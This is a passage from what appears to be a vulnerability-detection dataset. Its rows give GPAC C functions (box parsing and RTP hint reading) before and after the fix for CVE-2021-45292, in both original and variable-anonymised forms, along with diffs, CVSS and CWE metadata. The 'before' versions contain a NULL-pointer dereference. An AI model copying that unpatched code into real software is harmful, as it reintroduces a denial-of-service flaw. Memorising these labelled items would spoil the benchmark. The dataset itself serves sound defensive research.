((GF_SegmentIndexBox *)VAR_17)->compressed_diff = (s32)VAR_8 - (s32)VAR_16;
}
else if (VAR_4==VAR_39) {
((GF_SubsegmentIndexBox *)VAR_17)->compressed_diff = (s32)VAR_8 - (s32)VAR_16;
}
VAR_17->internal_flags = VAR_59;
}
if (VAR_13 && (VAR_13 != VAR_24)) {
gf_isom_box_del(VAR_17);
*VAR_0 = NULL;
if (!VAR_18) {
GF_LOG(VAR_29, VAR_28, (""[iso file] Read Box \""%s\"" (start ""VAR_30"") failed (%s) - skipping\n"", gf_4cc_to_str(VAR_4), VAR_9, gf_error_to_string(VAR_13)));
}
return VAR_13;
}
if (VAR_11-VAR_9 > VAR_8) {
if (!VAR_18) {
GF_LOG(VAR_60, VAR_28, (""[iso file] Box \""%s\"" size ""VAR_30"" (start ""VAR_30"") invalid (read ""VAR_30"")\n"", gf_4cc_to_str(VAR_4), VAR_8, VAR_9, (VAR_11-VAR_9) ));
}
gf_bs_seek(VAR_1, VAR_9+VAR_8);
} else if (VAR_11-VAR_9 < VAR_8) {
u32 VAR_61 = (u32) (VAR_8-(VAR_11-VAR_9));
if (!VAR_18) {
if ((VAR_61!=4) || gf_bs_peek_bits(VAR_1, 32, 0)) {
GF_LOG(VAR_60, VAR_28, (""[iso file] Box \""%s\"" (start ""VAR_30"") has %u extra bytes\n"", gf_4cc_to_str(VAR_4), VAR_9, VAR_61));
VAR_62 += VAR_61;
}
}
gf_bs_skip_bytes(VAR_1, VAR_61);
}
*VAR_0 = VAR_17;
return VAR_13;
}",gpac/3dafcb5e71e9ffebb50238784dcad8b105da81f6/box_funcs.c/vul/before/0.json,"GF_Err gf_isom_box_parse_ex(GF_Box **outBox, GF_BitStream *bs, u32 parent_type, Bool is_root_box)
{
	u32 type, uuid_type, hdr_size, restore_type;
	u64 size, start, comp_start, end;
	char uuid[16];
	GF_Err e;
	GF_BitStream *uncomp_bs = NULL;
	u8 *uncomp_data = NULL;
	u32 compressed_size=0;
	GF_Box *newBox;
	Bool skip_logs = (gf_bs_get_cookie(bs) & GF_ISOM_BS_COOKIE_NO_LOGS ) ? GF_TRUE : GF_FALSE;
	Bool is_special = GF_TRUE;
	
	if ((bs == NULL) || (outBox == NULL) ) return GF_BAD_PARAM;
	*outBox = NULL;
	if (gf_bs_available(bs) < 8) {
		return GF_ISOM_INCOMPLETE_FILE;
	}

	comp_start = start = gf_bs_get_position(bs);

	uuid_type = 0;
	size = (u64) gf_bs_read_u32(bs);
	hdr_size = 4;
	/*fix for some boxes found in some old hinted files*/
	if ((size >= 2) && (size <= 4)) {
		size = 4;
		type = GF_ISOM_BOX_TYPE_VOID;
	} else {
		type = gf_bs_read_u32(bs);
		hdr_size += 4;
		/*no size means till end of file - EXCEPT FOR some old QuickTime boxes...*/
		if (type == GF_ISOM_BOX_TYPE_TOTL)
			size = 12;
		if (!size) {
			if (is_root_box) {
				if (!skip_logs) {
					GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Warning Read Box type %s (0x%08X) size 0 reading till the end of file\n"", gf_4cc_to_str(type), type));
				}
				size = gf_bs_available(bs) + 8;
			} else {
				if (!skip_logs) {
					GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Read Box type %s (0x%08X) at position ""LLU"" has size 0 but is not at root/file level, skipping\n"", gf_4cc_to_str(type), type, start));
					return GF_EOS;
				}
				return GF_OK;
			}
		}
		if (is_root_box && (size>=8)) {
			Bool do_uncompress = GF_FALSE;
			u8 *compb = NULL;
			u32 osize = 0;
			u32 otype = type;
			if (type==GF_4CC('!', 'm', 'o', 'f')) {
				do_uncompress = GF_TRUE;
				type = GF_ISOM_BOX_TYPE_MOOF;
			}
			else if (type==GF_4CC('!', 'm', 'o', 'v')) {
				do_uncompress = GF_TRUE;
				type = GF_ISOM_BOX_TYPE_MOOV;
			}
			else if (type==GF_4CC('!', 's', 'i', 'x')) {
				do_uncompress = GF_TRUE;
				type = GF_ISOM_BOX_TYPE_SIDX;
			}
			else if (type==GF_4CC('!', 's', 's', 'x')) {
				do_uncompress = GF_TRUE;
				type = GF_ISOM_BOX_TYPE_SSIX;
			}

			if (do_uncompress) {
				compb = gf_malloc((u32) (size-8));

				compressed_size = (u32) (size - 8);
				gf_bs_read_data(bs, compb, compressed_size);
				e = gf_gz_decompress_payload(compb, compressed_size, &uncomp_data, &osize);
				if (e) {
					GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Failed to uncompress payload for box type %s (0x%08X)\n"", gf_4cc_to_str(otype), otype));
					return e;
				}

				//keep size as complete box size for tests below
				size = osize + 8;
				uncomp_bs = gf_bs_new(uncomp_data, osize, GF_BITSTREAM_READ);
				bs = uncomp_bs;
				start = 0;
				gf_free(compb);
			}
		}
	}
	/*handle uuid*/
	memset(uuid, 0, 16);
	if (type == GF_ISOM_BOX_TYPE_UUID ) {
		if (gf_bs_available(bs) < 16) {
			return GF_ISOM_INCOMPLETE_FILE;
		}
		gf_bs_read_data(bs, uuid, 16);
		hdr_size += 16;
		uuid_type = gf_isom_solve_uuid_box(uuid);
	}

	//handle large box
	if (size == 1) {
		if (gf_bs_available(bs) < 8) {
			return GF_ISOM_INCOMPLETE_FILE;
		}
		size = gf_bs_read_u64(bs);
		hdr_size += 8;
	}
	if (!skip_logs)
		GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Read Box type %s size ""LLD"" start ""LLD""\n"", gf_4cc_to_str(type), size,  start));

	if ( size < hdr_size ) {
		GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Box size ""LLD"" less than box header size %d\n"", size, hdr_size));
		return GF_ISOM_INVALID_FILE;
	}
	restore_type = 0;
	if ((parent_type==GF_ISOM_BOX_TYPE_STSD) && (type==GF_QT_SUBTYPE_RAW) ) {
		u64 cookie = gf_bs_get_cookie(bs);
		restore_type = type;
		if (cookie & GF_ISOM_BS_COOKIE_VISUAL_TRACK)
			type = GF_QT_SUBTYPE_RAW_VID;
		else
			type = GF_QT_SUBTYPE_RAW_AUD;

	}

	//some special boxes (references and track groups) are handled by a single generic box with an associated ref/group type
	if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_TREF)) {
		newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_REFT);
		if (!newBox) return GF_OUT_OF_MEM;
		((GF_TrackReferenceTypeBox*)newBox)->reference_type = type;
	} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_IREF)) {
		newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_REFI);
		if (!newBox) return GF_OUT_OF_MEM;
		((GF_ItemReferenceTypeBox*)newBox)->reference_type = type;
	} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_TRGR)) {
		newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_TRGT);
		if (!newBox) return GF_OUT_OF_MEM;
		((GF_TrackGroupTypeBox*)newBox)->group_type = type;
	} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_GRPL)) {
		newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_GRPT);
		if (!newBox) return GF_OUT_OF_MEM;
		((GF_EntityToGroupTypeBox*)newBox)->grouping_type = type;
	} else {
		//OK, create the box based on the type
		is_special = GF_FALSE;
		newBox = gf_isom_box_new_ex(uuid_type ? uuid_type : type, parent_type, skip_logs, is_root_box);
		if (!newBox) return GF_OUT_OF_MEM;
	}

	//OK, init and read this box
	if (type==GF_ISOM_BOX_TYPE_UUID && !is_special) {
		memcpy(((GF_UUIDBox *)newBox)->uuid, uuid, 16);
		((GF_UUIDBox *)newBox)->internal_4cc = uuid_type;
	}

	if (!newBox->type) newBox->type = type;
	if (restore_type)
		newBox->type = restore_type;

	end = gf_bs_available(bs);
	if (size - hdr_size > end ) {
		newBox->size = size - hdr_size - end;
		*outBox = newBox;
		return GF_ISOM_INCOMPLETE_FILE;
	}

	newBox->size = size - hdr_size;

	e = gf_isom_full_box_read(newBox, bs);
	if (!e) e = gf_isom_box_read(newBox, bs);
	if (e) {
		if (gf_opts_get_bool(""core"", ""no-check""))
			e = GF_OK;
	}
	newBox->size = size;
	end = gf_bs_get_position(bs);

	if (uncomp_bs) {
		gf_free(uncomp_data);
		gf_bs_del(uncomp_bs);
		if (e) {
			gf_isom_box_del(newBox);
			*outBox = NULL;
			return e;
		}
		//move size to real bitstream offsets for tests below
		size -= 8;
		//remember compressed vs real size info for moof in order to properly recompute data_offset/base_data_offset
		if (type==GF_ISOM_BOX_TYPE_MOOF) {
			((GF_MovieFragmentBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
		}
		//remember compressed vs real size info for moov in order to properly recompute chunk offset
		else if (type==GF_ISOM_BOX_TYPE_MOOV) {
			((GF_MovieBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
			((GF_MovieBox *)newBox)->file_offset = comp_start;
		}
		//remember compressed vs real size info for dump
		else if (type==GF_ISOM_BOX_TYPE_SIDX) {
			((GF_SegmentIndexBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
		}
		//remember compressed vs real size info for dump
		else if (type==GF_ISOM_BOX_TYPE_SSIX) {
			((GF_SubsegmentIndexBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
		}
		newBox->internal_flags = GF_ISOM_BOX_COMPRESSED;
	}


	if (e && (e != GF_ISOM_INCOMPLETE_FILE)) {
		gf_isom_box_del(newBox);
		*outBox = NULL;

		if (!skip_logs) {
			GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Read Box \""%s\"" (start ""LLU"") failed (%s) - skipping\n"", gf_4cc_to_str(type), start, gf_error_to_string(e)));
		}
		//we don't try to reparse known boxes that have been failing (too dangerous)
		return e;
	}

	if (end-start > size) {
		if (!skip_logs) {
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box \""%s\"" size ""LLU"" (start ""LLU"") invalid (read ""LLU"")\n"", gf_4cc_to_str(type), size, start, (end-start) ));
		}
		/*let's still try to load the file since no error was notified*/
		gf_bs_seek(bs, start+size);
	} else if (end-start < size) {
		u32 to_skip = (u32) (size-(end-start));
		if (!skip_logs) {
			if ((to_skip!=4) || gf_bs_peek_bits(bs, 32, 0)) {
				GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box \""%s\"" (start ""LLU"") has %u extra bytes\n"", gf_4cc_to_str(type), start, to_skip));
				unused_bytes += to_skip;
			}
		}
		gf_bs_skip_bytes(bs, to_skip);
	}
	*outBox = newBox;

	return e;
}","GF_Err gf_isom_box_parse_ex(GF_Box **VAR_0, GF_BitStream *VAR_1, u32 VAR_2, Bool VAR_3)
{
	u32 VAR_4, VAR_5, VAR_6, VAR_7;
	u64 VAR_8, VAR_9, VAR_10, VAR_11;
	char VAR_12[16];
	GF_Err VAR_13;
	GF_BitStream *VAR_14 = NULL;
	u8 *VAR_15 = NULL;
	u32 VAR_16=0;
	GF_Box *VAR_17;
	Bool VAR_18 = (gf_bs_get_cookie(VAR_1) & VAR_19 ) ? VAR_20 : VAR_21;
	Bool VAR_22 = VAR_20;
	
	if ((VAR_1 == NULL) || (VAR_0 == NULL) ) return VAR_23;
	*VAR_0 = NULL;
	if (gf_bs_available(VAR_1) < 8) {
		return VAR_24;
	}

	VAR_10 = VAR_9 = gf_bs_get_position(VAR_1);

	VAR_5 = 0;
	VAR_8 = (u64) gf_bs_read_u32(VAR_1);
	VAR_6 = 4;
	/* COMMENT_0 */
	if ((VAR_8 >= 2) && (VAR_8 <= 4)) {
		VAR_8 = 4;
		VAR_4 = VAR_25;
	} else {
		VAR_4 = gf_bs_read_u32(VAR_1);
		VAR_6 += 4;
		/* COMMENT_1 */
		if (VAR_4 == VAR_26)
			VAR_8 = 12;
		if (!VAR_8) {
			if (VAR_3) {
				if (!VAR_18) {
					GF_LOG(VAR_27, VAR_28, (""[iso file] Warning Read Box type %s (0x%08X) size 0 reading till the end of file\n"", gf_4cc_to_str(VAR_4), VAR_4));
				}
				VAR_8 = gf_bs_available(VAR_1) + 8;
			} else {
				if (!VAR_18) {
					GF_LOG(VAR_29, VAR_28, (""[iso file] Read Box type %s (0x%08X) at position ""VAR_30"" has size 0 but is not at root/file level, skipping\n"", gf_4cc_to_str(VAR_4), VAR_4, VAR_9));
					return VAR_31;
				}
				return VAR_32;
			}
		}
		if (VAR_3 && (VAR_8>=8)) {
			Bool VAR_33 = VAR_21;
			u8 *VAR_34 = NULL;
			u32 VAR_35 = 0;
			u32 VAR_36 = VAR_4;
			if (VAR_4==GF_4CC('!', 'm', 'o', 'f')) {
				VAR_33 = VAR_20;
				VAR_4 = VAR_37;
			}
			else if (VAR_4==GF_4CC('!', 'm', 'o', 'v')) {
				VAR_33 = VAR_20;
				VAR_4 = VAR_38;
			}
			else if (VAR_4==GF_4CC('!', 's', 'i', 'x')) {
				VAR_33 = VAR_20;
				VAR_4 = VAR_39;
			}
			else if (VAR_4==GF_4CC('!', 's', 's', 'x')) {
				VAR_33 = VAR_20;
				VAR_4 = VAR_40;
			}

			if (VAR_33) {
				VAR_34 = gf_malloc((u32) (VAR_8-8));

				VAR_16 = (u32) (VAR_8 - 8);
				gf_bs_read_data(VAR_1, VAR_34, VAR_16);
				VAR_13 = gf_gz_decompress_payload(VAR_34, VAR_16, &VAR_15, &VAR_35);
				if (VAR_13) {
					GF_LOG(VAR_29, VAR_28, (""[iso file] Failed to uncompress payload for box type %s (0x%08X)\n"", gf_4cc_to_str(VAR_36), VAR_36));
					return VAR_13;
				}

				/* COMMENT_2 */
				VAR_8 = VAR_35 + 8;
				VAR_14 = gf_bs_new(VAR_15, VAR_35, VAR_41);
				VAR_1 = VAR_14;
				VAR_9 = 0;
				gf_free(VAR_34);
			}
		}
	}
	/* COMMENT_3 */
	memset(VAR_12, 0, 16);
	if (VAR_4 == VAR_42 ) {
		if (gf_bs_available(VAR_1) < 16) {
			return VAR_24;
		}
		gf_bs_read_data(VAR_1, VAR_12, 16);
		VAR_6 += 16;
		VAR_5 = gf_isom_solve_uuid_box(VAR_12);
	}

	/* COMMENT_4 */
	if (VAR_8 == 1) {
		if (gf_bs_available(VAR_1) < 8) {
			return VAR_24;
		}
		VAR_8 = gf_bs_read_u64(VAR_1);
		VAR_6 += 8;
	}
	if (!VAR_18)
		GF_LOG(VAR_27, VAR_28, (""[iso file] Read Box type %s size ""VAR_43"" start ""VAR_43""\n"", gf_4cc_to_str(VAR_4), VAR_8,  VAR_9));

	if ( VAR_8 < VAR_6 ) {
		GF_LOG(VAR_27, VAR_28, (""[iso file] Box size ""VAR_43"" less than box header size %d\n"", VAR_8, VAR_6));
		return VAR_44;
	}
	VAR_7 = 0;
	if ((VAR_2==VAR_45) && (VAR_4==VAR_46) ) {
		u64 VAR_47 = gf_bs_get_cookie(VAR_1);
		VAR_7 = VAR_4;
		if (VAR_47 & VAR_48)
			VAR_4 = VAR_49;
		else
			VAR_4 = VAR_50;

	}

	/* COMMENT_5 */
	if (VAR_2 && (VAR_2 == VAR_51)) {
		VAR_17 = gf_isom_box_new(VAR_52);
		if (!VAR_17) return VAR_53;
		((GF_TrackReferenceTypeBox*)VAR_17)->reference_type = VAR_4;
	} else if (VAR_2 && (VAR_2 == VAR_54)) {
		VAR_17 = gf_isom_box_new(VAR_55);
		if (!VAR_17) return VAR_53;
		((GF_ItemReferenceTypeBox*)VAR_17)->reference_type = VAR_4;
	} else if (VAR_2 && (VAR_2 == VAR_56)) {
		VAR_17 = gf_isom_box_new(VAR_57);
		if (!VAR_17) return VAR_53;
		((GF_TrackGroupTypeBox*)VAR_17)->group_type = VAR_4;
	} else if (VAR_2 && (VAR_2 == VAR_58)) {
		VAR_17 = gf_isom_box_new(VAR_59);
		if (!VAR_17) return VAR_53;
		((GF_EntityToGroupTypeBox*)VAR_17)->grouping_type = VAR_4;
	} else {
		/* COMMENT_6 */
		VAR_22 = VAR_21;
		VAR_17 = gf_isom_box_new_ex(VAR_5 ? VAR_5 : VAR_4, VAR_2, VAR_18, VAR_3);
		if (!VAR_17) return VAR_53;
	}

	/* COMMENT_7 */
	if (VAR_4==VAR_42 && !VAR_22) {
		memcpy(((GF_UUIDBox *)VAR_17)->uuid, VAR_12, 16);
		((GF_UUIDBox *)VAR_17)->internal_4cc = VAR_5;
	}

	if (!VAR_17->type) VAR_17->type = VAR_4;
	if (VAR_7)
		VAR_17->type = VAR_7;

	VAR_11 = gf_bs_available(VAR_1);
	if (VAR_8 - VAR_6 > VAR_11 ) {
		VAR_17->size = VAR_8 - VAR_6 - VAR_11;
		*VAR_0 = VAR_17;
		return VAR_24;
	}

	VAR_17->size = VAR_8 - VAR_6;

	VAR_13 = gf_isom_full_box_read(VAR_17, VAR_1);
	if (!VAR_13) VAR_13 = gf_isom_box_read(VAR_17, VAR_1);
	if (VAR_13) {
		if (gf_opts_get_bool(""core"", ""no-check""))
			VAR_13 = VAR_32;
	}
	VAR_17->size = VAR_8;
	VAR_11 = gf_bs_get_position(VAR_1);

	if (VAR_14) {
		gf_free(VAR_15);
		gf_bs_del(VAR_14);
		if (VAR_13) {
			gf_isom_box_del(VAR_17);
			*VAR_0 = NULL;
			return VAR_13;
		}
		/* COMMENT_8 */
		VAR_8 -= 8;
		/* COMMENT_9 */
		if (VAR_4==VAR_37) {
			((GF_MovieFragmentBox *)VAR_17)->compressed_diff = (s32)VAR_8 - (s32)VAR_16;
		}
		/* COMMENT_10 */
		else if (VAR_4==VAR_38) {
			((GF_MovieBox *)VAR_17)->compressed_diff = (s32)VAR_8 - (s32)VAR_16;
			((GF_MovieBox *)VAR_17)->file_offset = VAR_10;
		}
		/* COMMENT_11 */
		else if (VAR_4==VAR_39) {
			((GF_SegmentIndexBox *)VAR_17)->compressed_diff = (s32)VAR_8 - (s32)VAR_16;
		}
		/* COMMENT_11 */
		else if (VAR_4==VAR_40) {
			((GF_SubsegmentIndexBox *)VAR_17)->compressed_diff = (s32)VAR_8 - (s32)VAR_16;
		}
		VAR_17->internal_flags = VAR_60;
	}


	if (VAR_13 && (VAR_13 != VAR_24)) {
		gf_isom_box_del(VAR_17);
		*VAR_0 = NULL;

		if (!VAR_18) {
			GF_LOG(VAR_29, VAR_28, (""[iso file] Read Box \""%s\"" (start ""VAR_30"") failed (%s) - skipping\n"", gf_4cc_to_str(VAR_4), VAR_9, gf_error_to_string(VAR_13)));
		}
		/* COMMENT_12 */
		return VAR_13;
	}

	if (VAR_11-VAR_9 > VAR_8) {
		if (!VAR_18) {
			GF_LOG(VAR_61, VAR_28, (""[iso file] Box \""%s\"" size ""VAR_30"" (start ""VAR_30"") invalid (read ""VAR_30"")\n"", gf_4cc_to_str(VAR_4), VAR_8, VAR_9, (VAR_11-VAR_9) ));
		}
		/* COMMENT_13 */
		gf_bs_seek(VAR_1, VAR_9+VAR_8);
	} else if (VAR_11-VAR_9 < VAR_8) {
		u32 VAR_62 = (u32) (VAR_8-(VAR_11-VAR_9));
		if (!VAR_18) {
			if ((VAR_62!=4) || gf_bs_peek_bits(VAR_1, 32, 0)) {
				GF_LOG(VAR_61, VAR_28, (""[iso file] Box \""%s\"" (start ""VAR_30"") has %u extra bytes\n"", gf_4cc_to_str(VAR_4), VAR_9, VAR_62));
				VAR_63 += VAR_62;
			}
		}
		gf_bs_skip_bytes(VAR_1, VAR_62);
	}
	*VAR_0 = VAR_17;

	return VAR_13;
}",gpac/3dafcb5e71e9ffebb50238784dcad8b105da81f6/box_funcs.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -41,6 +41,7 @@
 			} else {
 				if (!skip_logs) {
 					GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Read Box type %s (0x%08X) at position ""LLU"" has size 0 but is not at root/file level, skipping\n"", gf_4cc_to_str(type), type, start));
+					return GF_EOS;
 				}
 				return GF_OK;
 			}","{'deleted_lines': [], 'added_lines': ['\t\t\t\t\treturn GF_EOS;']}",True,The gf_isom_hint_rtp_read function in GPAC 1.0.1 allows attackers to cause a denial of service (Invalid memory address dereference) via a crafted file in the MP4Box command.,5.5,MEDIUM,1,valid,2021-12-10T09:02:48Z,4
CVE-2021-45292,['CWE-476'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1958,3dafcb5e71e9ffebb50238784dcad8b105da81f6,https://github.com/gpac/gpac/commit/3dafcb5e71e9ffebb50238784dcad8b105da81f6,src/isomedia/hinting.c,gf_isom_hint_rtp_read,"GF_Err gf_isom_hint_rtp_read(GF_RTPPacket *ptr, GF_BitStream *bs)
{
GF_Err e;
u8 hasTLV, type;
u16 i, count;
u32 TLVsize, tempSize;
GF_Box *a;
ptr->relativeTransTime = gf_bs_read_u32(bs);
gf_bs_read_int(bs, 2);
ptr->P_bit = gf_bs_read_int(bs, 1);
ptr->X_bit = gf_bs_read_int(bs, 1);
gf_bs_read_int(bs, 4);
ptr->M_bit = gf_bs_read_int(bs, 1);
ptr->payloadType = gf_bs_read_int(bs, 7);
ptr->SequenceNumber = gf_bs_read_u16(bs);
gf_bs_read_int(bs, 13);
hasTLV = gf_bs_read_int(bs, 1);
ptr->B_bit = gf_bs_read_int(bs, 1);
ptr->R_bit = gf_bs_read_int(bs, 1);
count = gf_bs_read_u16(bs);
if (hasTLV) {
tempSize = 4;TLVsize = gf_bs_read_u32(bs);
while (tempSize < TLVsize) {
e = gf_isom_box_parse(&a, bs);
if (e) return e;
gf_list_add(ptr->TLV, a);
tempSize += (u32) a->size;
}
if (tempSize != TLVsize) return GF_ISOM_INVALID_FILE;
}
for (i=0; i<count; i++) {
GF_GenericDTE *dte;
Bool add_it = 0;
type = gf_bs_read_u8(bs);
dte = NewDTE(type);
if (!dte) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso] invalid DTE code %d in hint sample %d of trackID %d\n"", type, ptr->sampleNumber, ptr->trackID));
return GF_ISOM_INVALID_FILE;
}
e = ReadDTE(dte, bs);
if (e) return e;
switch (type) {
case 1:
if ( ((GF_ImmediateDTE *)dte)->dataLength) add_it = 1;
break;
case 2:
if ( ((GF_SampleDTE *)dte)->dataLength) add_it = 1;
break;
case 3:
if ( ((GF_StreamDescDTE *)dte)->dataLength) add_it = 1;
break;
}
if (add_it)
gf_list_add(ptr->DataTable, dte);
else
DelDTE(dte);
}
return GF_OK;
}","GF_Err gf_isom_hint_rtp_read(GF_RTPPacket *VAR_0, GF_BitStream *VAR_1)
{
GF_Err VAR_2;
u8 VAR_3, VAR_4;
u16 VAR_5, VAR_6;
u32 VAR_7, VAR_8;
GF_Box *VAR_9;
VAR_0->relativeTransTime = gf_bs_read_u32(VAR_1);
gf_bs_read_int(VAR_1, 2);
VAR_0->P_bit = gf_bs_read_int(VAR_1, 1);
VAR_0->X_bit = gf_bs_read_int(VAR_1, 1);
gf_bs_read_int(VAR_1, 4);
VAR_0->M_bit = gf_bs_read_int(VAR_1, 1);
VAR_0->payloadType = gf_bs_read_int(VAR_1, 7);
VAR_0->SequenceNumber = gf_bs_read_u16(VAR_1);
gf_bs_read_int(VAR_1, 13);
VAR_3 = gf_bs_read_int(VAR_1, 1);
VAR_0->B_bit = gf_bs_read_int(VAR_1, 1);
VAR_0->R_bit = gf_bs_read_int(VAR_1, 1);
VAR_6 = gf_bs_read_u16(VAR_1);
if (VAR_3) {
VAR_8 = 4;
VAR_7 = gf_bs_read_u32(VAR_1);
while (VAR_8 < VAR_7) {
VAR_2 = gf_isom_box_parse(&VAR_9, VAR_1);
if (VAR_2) return VAR_2;
gf_list_add(VAR_0->TLV, VAR_9);
VAR_8 += (u32) VAR_9->size;
}
if (VAR_8 != VAR_7) return VAR_10;
}
for (VAR_5=0; VAR_5<VAR_6; VAR_5++) {
GF_GenericDTE *VAR_11;
Bool VAR_12 = 0;
VAR_4 = gf_bs_read_u8(VAR_1);
VAR_11 = NewDTE(VAR_4);
if (!VAR_11) {
GF_LOG(VAR_13, VAR_14, (""[iso] invalid DTE code %d in hint sample %d of trackID %d\n"", VAR_4, VAR_0->sampleNumber, VAR_0->trackID));
return VAR_10;
}
VAR_2 = ReadDTE(VAR_11, VAR_1);
if (VAR_2) return VAR_2;
switch (VAR_4) {
case 1:
if ( ((GF_ImmediateDTE *)VAR_11)->dataLength) VAR_12 = 1;
break;
case 2:
if ( ((GF_SampleDTE *)VAR_11)->dataLength) VAR_12 = 1;
break;
case 3:
if ( ((GF_StreamDescDTE *)VAR_11)->dataLength) VAR_12 = 1;
break;
}
if (VAR_12)
gf_list_add(VAR_0->DataTable, VAR_11);
else
DelDTE(VAR_11);
}
return VAR_15;
}",gpac/3dafcb5e71e9ffebb50238784dcad8b105da81f6/hinting.c/vul/before/0.json,"GF_Err gf_isom_hint_rtp_read(GF_RTPPacket *ptr, GF_BitStream *bs)
{
	GF_Err e;
	u8 hasTLV, type;
	u16 i, count;
	u32 TLVsize, tempSize;
	GF_Box *a;

	ptr->relativeTransTime = gf_bs_read_u32(bs);
	//RTP Header
	//1- reserved fields
	gf_bs_read_int(bs, 2);
	ptr->P_bit = gf_bs_read_int(bs, 1);
	ptr->X_bit = gf_bs_read_int(bs, 1);
	gf_bs_read_int(bs, 4);
	ptr->M_bit = gf_bs_read_int(bs, 1);
	ptr->payloadType = gf_bs_read_int(bs, 7);

	ptr->SequenceNumber = gf_bs_read_u16(bs);
	gf_bs_read_int(bs, 13);
	hasTLV = gf_bs_read_int(bs, 1);
	ptr->B_bit = gf_bs_read_int(bs, 1);
	ptr->R_bit = gf_bs_read_int(bs, 1);
	count = gf_bs_read_u16(bs);

	//read the TLV
	if (hasTLV) {
		tempSize = 4;	//TLVsize includes its field length
		TLVsize = gf_bs_read_u32(bs);
		while (tempSize < TLVsize) {
			e = gf_isom_box_parse(&a, bs);
			if (e) return e;
			if (!a) continue;
			gf_list_add(ptr->TLV, a);
			tempSize += (u32) a->size;
		}
		if (tempSize != TLVsize) return GF_ISOM_INVALID_FILE;
	}

	//read the DTEs
	for (i=0; i<count; i++) {
		GF_GenericDTE *dte;
		Bool add_it = 0;
		type = gf_bs_read_u8(bs);
		dte = NewDTE(type);
		if (!dte) {
			GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso] invalid DTE code %d in hint sample %d of trackID %d\n"", type, ptr->sampleNumber, ptr->trackID));
			return GF_ISOM_INVALID_FILE;
		}
		e = ReadDTE(dte, bs);
		if (e) return e;
		/*little opt, remove empty dte*/
		switch (type) {
		case 1:
			if ( ((GF_ImmediateDTE *)dte)->dataLength) add_it = 1;
			break;
		case 2:
			if ( ((GF_SampleDTE *)dte)->dataLength) add_it = 1;
			break;
		case 3:
			if ( ((GF_StreamDescDTE *)dte)->dataLength) add_it = 1;
			break;
		}
		if (add_it)
			gf_list_add(ptr->DataTable, dte);
		else
			DelDTE(dte);
	}
	return GF_OK;
}","GF_Err gf_isom_hint_rtp_read(GF_RTPPacket *VAR_0, GF_BitStream *VAR_1)
{
	GF_Err VAR_2;
	u8 VAR_3, VAR_4;
	u16 VAR_5, VAR_6;
	u32 VAR_7, VAR_8;
	GF_Box *VAR_9;

	VAR_0->relativeTransTime = gf_bs_read_u32(VAR_1);
	/* COMMENT_0 */
	/* COMMENT_1 */
	gf_bs_read_int(VAR_1, 2);
	VAR_0->P_bit = gf_bs_read_int(VAR_1, 1);
	VAR_0->X_bit = gf_bs_read_int(VAR_1, 1);
	gf_bs_read_int(VAR_1, 4);
	VAR_0->M_bit = gf_bs_read_int(VAR_1, 1);
	VAR_0->payloadType = gf_bs_read_int(VAR_1, 7);

	VAR_0->SequenceNumber = gf_bs_read_u16(VAR_1);
	gf_bs_read_int(VAR_1, 13);
	VAR_3 = gf_bs_read_int(VAR_1, 1);
	VAR_0->B_bit = gf_bs_read_int(VAR_1, 1);
	VAR_0->R_bit = gf_bs_read_int(VAR_1, 1);
	VAR_6 = gf_bs_read_u16(VAR_1);

	/* COMMENT_2 */
	if (VAR_3) {
		VAR_8 = 4;	/* COMMENT_3 */
		VAR_7 = gf_bs_read_u32(VAR_1);
		while (VAR_8 < VAR_7) {
			VAR_2 = gf_isom_box_parse(&VAR_9, VAR_1);
			if (VAR_2) return VAR_2;
			if (!VAR_9) continue;
			gf_list_add(VAR_0->TLV, VAR_9);
			VAR_8 += (u32) VAR_9->size;
		}
		if (VAR_8 != VAR_7) return VAR_10;
	}

	/* COMMENT_4 */
	for (VAR_5=0; VAR_5<VAR_6; VAR_5++) {
		GF_GenericDTE *VAR_11;
		Bool VAR_12 = 0;
		VAR_4 = gf_bs_read_u8(VAR_1);
		VAR_11 = NewDTE(VAR_4);
		if (!VAR_11) {
			GF_LOG(VAR_13, VAR_14, (""[iso] invalid DTE code %d in hint sample %d of trackID %d\n"", VAR_4, VAR_0->sampleNumber, VAR_0->trackID));
			return VAR_10;
		}
		VAR_2 = ReadDTE(VAR_11, VAR_1);
		if (VAR_2) return VAR_2;
		/* COMMENT_5 */
		switch (VAR_4) {
		case 1:
			if ( ((GF_ImmediateDTE *)VAR_11)->dataLength) VAR_12 = 1;
			break;
		case 2:
			if ( ((GF_SampleDTE *)VAR_11)->dataLength) VAR_12 = 1;
			break;
		case 3:
			if ( ((GF_StreamDescDTE *)VAR_11)->dataLength) VAR_12 = 1;
			break;
		}
		if (VAR_12)
			gf_list_add(VAR_0->DataTable, VAR_11);
		else
			DelDTE(VAR_11);
	}
	return VAR_15;
}",gpac/3dafcb5e71e9ffebb50238784dcad8b105da81f6/hinting.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -30,6 +30,7 @@
 		while (tempSize < TLVsize) {
 			e = gf_isom_box_parse(&a, bs);
 			if (e) return e;
+			if (!a) continue;
 			gf_list_add(ptr->TLV, a);
